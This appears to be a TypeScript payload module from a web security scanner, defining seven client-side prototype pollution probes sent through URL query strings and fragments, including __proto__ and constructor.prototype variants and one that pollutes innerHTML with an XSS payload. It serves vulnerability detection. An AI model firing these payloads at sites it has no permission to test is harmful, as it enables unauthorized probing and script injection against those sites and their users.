import type { PayloadVariant } from '../types';

export const META = {
  id: 'prototype-pollution-client',
  family: 'prototype-pollution-client' as const,
  name: 'Prototype Pollution (Client-Side)',
  description: 'Detects client-side prototype pollution via URL hash and query parameter payloads.',
  defaultRisk: 'none' as const,
  insertionPointKinds: ['query', 'path'],
};

const PROBES = [
  { value: '#__proto__[polluted]=pf', intent: 'Hash-based __proto__ pollution via fragment', signals: ['prototype-polluted'] },
  { value: '?__proto__[polluted]=pf', intent: 'Query param __proto__ pollution', signals: ['prototype-polluted'] },
  { value: '?constructor[prototype][polluted]=pf', intent: 'constructor.prototype chain pollution via query param', signals: ['prototype-polluted'] },
  { value: '#constructor[prototype][polluted]=pf', intent: 'Hash-based constructor.prototype chain pollution', signals: ['prototype-polluted'] },
  { value: '?__proto__.polluted=pf', intent: 'Dot-notation __proto__ pollution via query param', signals: ['prototype-polluted'] },
  { value: '?__proto__[toString]=pf', intent: 'Pollute toString to detect inherited property override', signals: ['prototype-polluted'] },
  { value: '#__proto__[innerHTML]=<img src=x onerror=alert(1)>', intent: 'Pollute innerHTML for XSS escalation via hash', signals: ['prototype-polluted', 'xss-executed'] },
];

export function variants(): PayloadVariant[] {
  return PROBES.map((p, i) => ({
    id: `proto-poll-client-${i + 1}`,
    family: 'prototype-pollution-client' as const,
    value: p.value,
    encoding: 'raw' as const,
    intent: p.intent,
    requiresOast: false,
    requiresBrowser: true,
    destructiveRisk: 'none' as const,
    expectedSignals: p.signals,
  }));
}
